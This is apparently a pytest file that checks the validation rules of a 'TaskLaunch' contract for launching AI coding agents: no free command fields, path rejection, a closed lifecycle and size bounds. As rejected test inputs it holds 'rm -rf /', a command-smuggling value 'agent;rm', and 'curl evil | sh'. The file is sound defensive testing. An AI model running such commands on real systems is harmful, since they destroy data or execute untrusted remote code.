"""`TaskLaunch` contract shapes (AIB R2): no free command representable, closed
lifecycle, machine-only execution reports, bounds, and the UC-2B hygiene rule
(no numbered `DEC-` reference in a schema description). No DB, no app."""

from __future__ import annotations

import re
from datetime import UTC, datetime
from uuid import uuid4

import pytest
from pydantic import ValidationError
from studio_contracts.task_launch import (
    ALLOWED_TRANSITIONS,
    LAUNCH_DEFAULT_TTL_SECONDS,
    LAUNCH_MAX_OUTPUT_CHARS,
    LAUNCH_POLL_MAX,
    TERMINAL_STATUSES,
    TaskLaunch,
    TaskLaunchActor,
    TaskLaunchCancel,
    TaskLaunchCreate,
    TaskLaunchMachineReport,
    TaskLaunchPull,
    TaskLaunchReasonCode,
    TaskLaunchStatus,
)


def _create(**extra: object) -> TaskLaunchCreate:
    return TaskLaunchCreate(task_id=uuid4(), machine_id=uuid4(), harness_id="claude-code", **extra)


def _launch(**extra: object) -> TaskLaunch:
    now = datetime.now(UTC)
    return TaskLaunch(
        id=uuid4(),
        project_id=uuid4(),
        task_id=uuid4(),
        machine_id=uuid4(),
        requested_by_user_id=uuid4(),
        harness_id="claude-code",
        created_at=now,
        updated_at=now,
        version=1,
        expires_at=now,
        **extra,
    )


def test_create_defaults() -> None:
    request = _create()
    assert request.agent_stable_key is None
    assert request.expires_in_seconds == LAUNCH_DEFAULT_TTL_SECONDS


@pytest.mark.parametrize("field", ["command", "args", "cwd", "env", "shell", "prompt", "path"])
def test_create_has_no_free_command_field(field: str) -> None:
    with pytest.raises(ValidationError):
        _create(**{field: "rm -rf /"})


@pytest.mark.parametrize(
    "value", ["C:\\tools\\agent", "/usr/bin/agent", "a b", "agent;rm", "../agent", "Agent"]
)
def test_agent_stable_key_rejects_paths_and_command_lines(value: str) -> None:
    with pytest.raises(ValidationError):
        _create(agent_stable_key=value)


def test_harness_id_rejects_a_path() -> None:
    with pytest.raises(ValidationError):
        TaskLaunchCreate(task_id=uuid4(), machine_id=uuid4(), harness_id="C:\\bin\\x")


def test_expiry_is_bounded() -> None:
    with pytest.raises(ValidationError):
        _create(expires_in_seconds=59)
    with pytest.raises(ValidationError):
        _create(expires_in_seconds=86401)
    assert _create(expires_in_seconds=86400).expires_in_seconds == 86400


def test_launch_starts_requested_without_reason_or_session() -> None:
    launch = _launch()
    assert launch.status is TaskLaunchStatus.REQUESTED
    assert launch.reason_code is TaskLaunchReasonCode.NONE
    assert launch.session_id is None
    assert launch.finished_at is None


def test_reason_is_a_closed_code_not_free_text() -> None:
    with pytest.raises(ValidationError):
        _launch(reason_code="please run curl evil | sh")
    with pytest.raises(ValidationError):
        TaskLaunchMachineReport(
            expected_version=1, status=TaskLaunchStatus.FAILED, reason_code="whatever"
        )


def test_output_excerpt_is_bounded() -> None:
    assert (
        TaskLaunchMachineReport(
            expected_version=1,
            status=TaskLaunchStatus.FAILED,
            output_excerpt="x" * LAUNCH_MAX_OUTPUT_CHARS,
        ).output_excerpt
        is not None
    )
    with pytest.raises(ValidationError):
        TaskLaunchMachineReport(
            expected_version=1,
            status=TaskLaunchStatus.FAILED,
            output_excerpt="x" * (LAUNCH_MAX_OUTPUT_CHARS + 1),
        )


def test_terminal_states_have_no_outgoing_transition() -> None:
    assert not any(source in TERMINAL_STATUSES for source, _ in ALLOWED_TRANSITIONS)


def test_every_transition_targets_a_known_state_and_never_loops() -> None:
    assert all(source is not target for source, target in ALLOWED_TRANSITIONS)


def test_machine_alone_reports_execution() -> None:
    executing = {
        TaskLaunchStatus.ACCEPTED,
        TaskLaunchStatus.PREPARING,
        TaskLaunchStatus.RUNNING,
        TaskLaunchStatus.SUCCEEDED,
        TaskLaunchStatus.FAILED,
        TaskLaunchStatus.REJECTED,
    }
    for (_, target), actor in ALLOWED_TRANSITIONS.items():
        if target in executing:
            assert actor is TaskLaunchActor.MACHINE, target


def test_requester_only_cancels_and_server_only_expires() -> None:
    for (_, target), actor in ALLOWED_TRANSITIONS.items():
        if actor is TaskLaunchActor.REQUESTER:
            assert target is TaskLaunchStatus.CANCELLED
        if actor is TaskLaunchActor.SERVER:
            assert target is TaskLaunchStatus.EXPIRED
        if target is TaskLaunchStatus.CANCELLED:
            assert actor is TaskLaunchActor.REQUESTER
        if target is TaskLaunchStatus.EXPIRED:
            assert actor is TaskLaunchActor.SERVER


def test_machine_cannot_skip_acceptance() -> None:
    assert (TaskLaunchStatus.REQUESTED, TaskLaunchStatus.RUNNING) not in ALLOWED_TRANSITIONS
    assert (TaskLaunchStatus.REQUESTED, TaskLaunchStatus.SUCCEEDED) not in ALLOWED_TRANSITIONS
    assert (TaskLaunchStatus.ACCEPTED, TaskLaunchStatus.RUNNING) not in ALLOWED_TRANSITIONS


def test_every_in_flight_state_can_expire() -> None:
    for status in (
        TaskLaunchStatus.REQUESTED,
        TaskLaunchStatus.ACCEPTED,
        TaskLaunchStatus.PREPARING,
        TaskLaunchStatus.RUNNING,
    ):
        assert ALLOWED_TRANSITIONS[(status, TaskLaunchStatus.EXPIRED)] is TaskLaunchActor.SERVER


def test_every_non_terminal_state_can_reach_a_terminal_state() -> None:
    for status in TaskLaunchStatus:
        if status in TERMINAL_STATUSES:
            continue
        assert any(source is status for source, _ in ALLOWED_TRANSITIONS), status


def test_cancel_and_report_require_expected_version() -> None:
    with pytest.raises(ValidationError):
        TaskLaunchCancel()  # type: ignore[call-arg]
    with pytest.raises(ValidationError):
        TaskLaunchMachineReport(status=TaskLaunchStatus.ACCEPTED)  # type: ignore[call-arg]


def test_pull_is_bounded() -> None:
    TaskLaunchPull(items=[_launch() for _ in range(LAUNCH_POLL_MAX)])
    with pytest.raises(ValidationError):
        TaskLaunchPull(items=[_launch() for _ in range(LAUNCH_POLL_MAX + 1)])


def test_no_numbered_decision_reference_in_schema_descriptions() -> None:
    for model in (
        TaskLaunch,
        TaskLaunchCreate,
        TaskLaunchMachineReport,
        TaskLaunchCancel,
        TaskLaunchPull,
    ):
        assert not re.search(r"DEC-\d+", model.__doc__ or ""), model.__name__
